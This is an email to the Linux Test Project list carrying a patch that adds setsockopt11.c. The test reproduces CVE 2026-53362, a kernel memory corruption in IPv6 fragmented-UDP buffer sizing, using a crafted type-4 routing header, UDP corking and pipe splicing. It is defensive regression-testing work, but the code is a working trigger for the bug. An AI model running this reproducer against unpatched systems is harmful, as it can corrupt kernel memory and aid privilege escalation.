Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 48849C44529
	for <ltp@archiver.kernel.org>; Tue, 21 Jul 2026 15:39:38 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 4F7D23E5282
	for <ltp@archiver.kernel.org>; Tue, 21 Jul 2026 17:39:36 +0200 (CEST)
Received: from in-3.smtp.seeweb.it (in-3.smtp.seeweb.it [217.194.8.3])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id 13EF33C0440
 for <ltp@lists.linux.it>; Tue, 21 Jul 2026 17:39:20 +0200 (CEST)
Received: from smtp-out2.suse.de (smtp-out2.suse.de [195.135.223.131])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-3.smtp.seeweb.it (Postfix) with ESMTPS id AC2811A010BB
 for <ltp@lists.linux.it>; Tue, 21 Jul 2026 17:39:19 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org
 [IPv6:2a07:de40:b281:104:10:150:64:97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out2.suse.de (Postfix) with ESMTPS id B40103DF3
 for <ltp@lists.linux.it>; Tue, 21 Jul 2026 15:39:18 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
 t=1784648358; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version: content-transfer-encoding:content-transfer-encoding;
 bh=J9Sg4D4dkLvZLdgBs1s6gpZK+/Y91SFIMzIa93f1kMU=;
 b=pXlvlV3o+qOIiZpyMex420mcGvVhx5uPC77WtX3dCDP9C1dv7iMxuDYcqpwETofuBv068g
 GsEKgJ5CogxTfLjx7TWIcnUfoJA7hEVqPBlkISsARgV1wuYUYGhY7y37NaBuCj4T7k4m2D
 XWbqZZYqfbI1aHnXHstBVctiq/SeRzM=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
 s=susede2_ed25519; t=1784648358;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version: content-transfer-encoding:content-transfer-encoding;
 bh=J9Sg4D4dkLvZLdgBs1s6gpZK+/Y91SFIMzIa93f1kMU=;
 b=LEiP/eKWO5lsw8ifnMETx3HH0/jypd7y7LOhBIomOBy6dQ3yzPvWaUtiEa3377wnXmRzvk
 Bv2RtvbkYRCemmBA==
Authentication-Results: smtp-out2.suse.de;
 dkim=pass header.d=suse.cz header.s=susede2_rsa header.b=pXlvlV3o;
 dkim=pass header.d=suse.cz header.s=susede2_ed25519 header.b="LEiP/eKW"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
 t=1784648358; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version: content-transfer-encoding:content-transfer-encoding;
 bh=J9Sg4D4dkLvZLdgBs1s6gpZK+/Y91SFIMzIa93f1kMU=;
 b=pXlvlV3o+qOIiZpyMex420mcGvVhx5uPC77WtX3dCDP9C1dv7iMxuDYcqpwETofuBv068g
 GsEKgJ5CogxTfLjx7TWIcnUfoJA7hEVqPBlkISsARgV1wuYUYGhY7y37NaBuCj4T7k4m2D
 XWbqZZYqfbI1aHnXHstBVctiq/SeRzM=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
 s=susede2_ed25519; t=1784648358;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version: content-transfer-encoding:content-transfer-encoding;
 bh=J9Sg4D4dkLvZLdgBs1s6gpZK+/Y91SFIMzIa93f1kMU=;
 b=LEiP/eKWO5lsw8ifnMETx3HH0/jypd7y7LOhBIomOBy6dQ3yzPvWaUtiEa3377wnXmRzvk
 Bv2RtvbkYRCemmBA==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 9D5B0779AA
 for <ltp@lists.linux.it>; Tue, 21 Jul 2026 15:39:18 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id kwcuJqaSX2o1DwAAD6G6ig
 (envelope-from <mdoucha@suse.cz>)
 for <ltp@lists.linux.it>; Tue, 21 Jul 2026 15:39:18 +0000
From: Martin Doucha <mdoucha@suse.cz>
To: ltp@lists.linux.it
Date: Tue, 21 Jul 2026 17:39:16 +0200
Message-ID: <20260721153917.64722-1-mdoucha@suse.cz>
X-Mailer: git-send-email 2.54.0
MIME-Version: 1.0
X-Rspamd-Action: no action
X-Spamd-Result: default: False [-3.01 / 50.00]; BAYES_HAM(-3.00)[100.00%];
 MID_CONTAINS_FROM(1.00)[]; NEURAL_HAM_LONG(-1.00)[-1.000];
 R_MISSING_CHARSET(0.50)[];
 R_DKIM_ALLOW(-0.20)[suse.cz:s=susede2_rsa,suse.cz:s=susede2_ed25519];
 NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
 MX_GOOD(-0.01)[]; TO_MATCH_ENVRCPT_ALL(0.00)[];
 RBL_SPAMHAUS_BLOCKED_OPENRESOLVER(0.00)[2a07:de40:b281:104:10:150:64:97:from]; 
 RCPT_COUNT_ONE(0.00)[1]; ARC_NA(0.00)[];
 FUZZY_RATELIMITED(0.00)[rspamd.com];
 DKIM_SIGNED(0.00)[suse.cz:s=susede2_rsa,suse.cz:s=susede2_ed25519];
 RCVD_TLS_ALL(0.00)[]; DKIM_TRACE(0.00)[suse.cz:+];
 RCVD_COUNT_TWO(0.00)[2]; FROM_EQ_ENVFROM(0.00)[];
 FROM_HAS_DN(0.00)[]; MIME_TRACE(0.00)[0:+]; TO_DN_NONE(0.00)[];
 RECEIVED_SPAMHAUS_BLOCKED_OPENRESOLVER(0.00)[2a07:de40:b281:106:10:150:64:167:received];
 PREVIOUSLY_DELIVERED(0.00)[ltp@lists.linux.it];
 RCVD_VIA_SMTP_AUTH(0.00)[];
 DBL_BLOCKED_OPENRESOLVER(0.00)[suse.com:email, suse.cz:email, suse.cz:dkim,
 suse.cz:mid, imap1.dmz-prg2.suse.org:helo, imap1.dmz-prg2.suse.org:rdns]
X-Rspamd-Server: rspamd2.dmz-prg2.suse.org
X-Rspamd-Queue-Id: B40103DF3
X-Virus-Scanned: clamav-milter 1.0.9 at in-3.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH] Add test for CVE 2026-53362
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

Add test for memory corruption due to miscalculation of socket buffer
size for fragmented packets with gaps.

Signed-off-by: Martin Doucha <mdoucha@suse.cz>
---

Bug reproducibility verified on affected kernels v6.4 and v6.12.

 runtest/cve                                   |   1 +
 runtest/syscalls                              |   1 +
 .../kernel/syscalls/setsockopt/.gitignore     |   1 +
 .../kernel/syscalls/setsockopt/setsockopt11.c | 171 ++++++++++++++++++
 4 files changed, 174 insertions(+)
 create mode 100644 testcases/kernel/syscalls/setsockopt/setsockopt11.c

diff --git a/runtest/cve b/runtest/cve
index 3bbcfd6a2..99d84270b 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -88,6 +88,7 @@ cve-2023-1829 tcindex01
 cve-2023-0461 setsockopt10
 cve-2023-31248 nft02
 cve-2023-52879 fanotify25
+cve-2026-53362 setsockopt11
 # Tests below may cause kernel memory leak
 cve-2020-25704 perf_event_open03
 cve-2022-0185 fsconfig03
diff --git a/runtest/syscalls b/runtest/syscalls
index c84c32a6f..949ad7622 100644
--- a/runtest/syscalls
+++ b/runtest/syscalls
@@ -1524,6 +1524,7 @@ setsockopt07 setsockopt07
 setsockopt08 setsockopt08
 setsockopt09 setsockopt09
 setsockopt10 setsockopt10
+setsockopt11 setsockopt11
 
 settimeofday01 settimeofday01
 settimeofday02 settimeofday02
diff --git a/testcases/kernel/syscalls/setsockopt/.gitignore b/testcases/kernel/syscalls/setsockopt/.gitignore
index 5c05290a5..58cc82d9c 100644
--- a/testcases/kernel/syscalls/setsockopt/.gitignore
+++ b/testcases/kernel/syscalls/setsockopt/.gitignore
@@ -8,3 +8,4 @@
 /setsockopt08
 /setsockopt09
 /setsockopt10
+/setsockopt11
diff --git a/testcases/kernel/syscalls/setsockopt/setsockopt11.c b/testcases/kernel/syscalls/setsockopt/setsockopt11.c
new file mode 100644
index 000000000..5f09291b3
--- /dev/null
+++ b/testcases/kernel/syscalls/setsockopt/setsockopt11.c
@@ -0,0 +1,171 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (C) 2026 SUSE LLC
+ * Original reproducer by Massimiliano Oldani
+ * Simplified LTP port: Martin Doucha <mdoucha@suse.com>
+ */
+
+/*
+ * CVE 2026-53362
+ *
+ * Test for vulnerability in socket buffer size calculation for fragmented
+ * UDP packets with gaps. Reproducer based on:
+ * https://github.com/sgkdev/ipv6_frag_escape
+ *
+ * Memory corruption fixed in kernel v7.2:
+ * 736b380e28d0 ("ipv6: account for fraggap on the paged allocation path")
+ */
+
+#define _GNU_SOURCE
+#include <netinet/in.h>
+#include <netinet/udp.h>
+
+#include "tst_test.h"
+#include "tst_net.h"
+#include "lapi/splice.h"
+
+#define PIPE_COUNT 2
+#define PIPE_BUF_SIZE (1 << 20)
+
+#define BUFSIZE 4096
+#define PATTERN_SIZE 256
+#define PATTERN_CHAR 0x42
+
+#define TEST_HDRSIZE 640
+#define TEST_MTU 1280
+#define TEST_PORT 12345
+#define TEST_MSGSIZE (1232 - TEST_HDRSIZE)
+
+static int pipefds[PIPE_COUNT][2];
+static int sockfd = -1;
+static unsigned char buf[BUFSIZE];
+static struct sockaddr_in6 addr;
+
+static void setup(void)
+{
+	int i;
+
+	for (i = 0; i < PIPE_COUNT; i++)
+		pipefds[i][0] = pipefds[i][1] = -1;
+
+	tst_init_sockaddr_inet6_bin(&addr, &in6addr_loopback, TEST_PORT);
+}
+
+static int leak_pipe(void)
+{
+	int i, padding, segcount = (TEST_HDRSIZE - 8) / 16;
+
+	/* Create input pipe and fill it with test data */
+	memset(buf, PATTERN_CHAR, PATTERN_SIZE);
+
+	for (i = 0; i < PIPE_COUNT; i++) {
+		SAFE_PIPE(pipefds[i]);
+		SAFE_FCNTL(pipefds[i][1], F_SETPIPE_SZ, PIPE_BUF_SIZE);
+	}
+
+	SAFE_WRITE(SAFE_WRITE_ALL, pipefds[0][1], buf, PATTERN_SIZE);
+
+	/* Create socket and set packet header with frag gap */
+	sockfd = SAFE_SOCKET(AF_INET6, SOCK_DGRAM, 0);
+	padding = TEST_HDRSIZE - 8 - 16 * segcount;
+	memset(buf, 0, TEST_HDRSIZE);
+	buf[1] = (TEST_HDRSIZE - 8) / 8;
+	buf[2] = 4;
+	buf[3] = (unsigned char)(segcount - 1);
+	buf[4] = buf[3];
+
+	for (i = 0; i < segcount; i++) {
+		memcpy(buf + 8 + 16 * i, &in6addr_loopback,
+			sizeof(in6addr_loopback));
+	}
+
+	if (padding)
+		buf[9 + 16 * segcount] = (unsigned char)(padding - 2);
+
+	TEST(setsockopt(sockfd, IPPROTO_IPV6, IPV6_RTHDR, buf, TEST_HDRSIZE));
+
+	if (TST_RET == -1 && TST_ERR == EINVAL)
+		tst_brk(TCONF, "IPV6_RTHDR type 4 is not supported");
+	else if (TST_RET)
+		tst_brk(TBROK | TTERRNO, "setsockopt(IPV6_RTHDR) failed");
+
+	SAFE_SETSOCKOPT_INT(sockfd, IPPROTO_IPV6, IPV6_MTU, TEST_MTU);
+	SAFE_CONNECT(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+	SAFE_SETSOCKOPT_INT(sockfd, IPPROTO_UDP, UDP_CORK, 1);
+
+	/* Splice input pipe buffer page into socket */
+	memset(buf, 0, TEST_MSGSIZE);
+	buf[TEST_MSGSIZE - 6] = 1;
+	SAFE_WRITE(SAFE_WRITE_ALL, pipefds[1][1], buf, TEST_MSGSIZE);
+	splice(pipefds[1][0], NULL, sockfd, NULL, TEST_MSGSIZE, SPLICE_F_MORE);
+	tee(pipefds[0][0], pipefds[1][1], PATTERN_SIZE, 0);
+	splice(pipefds[1][0], NULL, sockfd, NULL, PATTERN_SIZE, SPLICE_F_MORE);
+	SAFE_CLOSE(sockfd);
+
+	/* Check whether pipe buffer got reused while still allocated */
+	tst_pollute_memory(0, ~(unsigned char)PATTERN_CHAR);
+	SAFE_READ(SAFE_READ_ALL, pipefds[0][0], buf, PATTERN_SIZE);
+
+	for (i = 0; i < PIPE_COUNT; i++) {
+		SAFE_CLOSE(pipefds[i][0]);
+		SAFE_CLOSE(pipefds[i][1]);
+	}
+
+	for (i = 0; i < PATTERN_SIZE; i++) {
+		if (buf[i] != PATTERN_CHAR)
+			return 1;
+	}
+
+	return 0;
+}
+
+static void run(void)
+{
+	int i, leaked = 0;
+
+	for (i = 0; i < 64; i++) {
+		if (tst_remaining_runtime() <= 0)
+			break;
+
+		leaked = leak_pipe();
+
+		if (leaked)
+			break;
+	}
+
+	if (leaked) {
+		tst_res(TFAIL, "Pipe buffer was corrupted");
+		return;
+	}
+
+	tst_res(TPASS, "Nothing bad happened (yet)");
+}
+
+static void cleanup(void)
+{
+	int i;
+
+	for (i = 0; i < PIPE_COUNT; i++) {
+		if (pipefds[i][0] >= 0) {
+			SAFE_CLOSE(pipefds[i][0]);
+			SAFE_CLOSE(pipefds[i][1]);
+		}
+	}
+
+	if (sockfd >= 0)
+		SAFE_CLOSE(sockfd);
+}
+
+static struct tst_test test = {
+	.test_all = run,
+	.setup = setup,
+	.cleanup = cleanup,
+	.runtime = 300,
+	.min_runtime = 30,
+	.taint_check = TST_TAINT_W | TST_TAINT_D,
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "736b380e28d0480c7bc3e022f1950f31fe53a7c5"},
+		{"CVE", "2026-53362"},
+		{}
+	},
+};
-- 
2.54.0


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
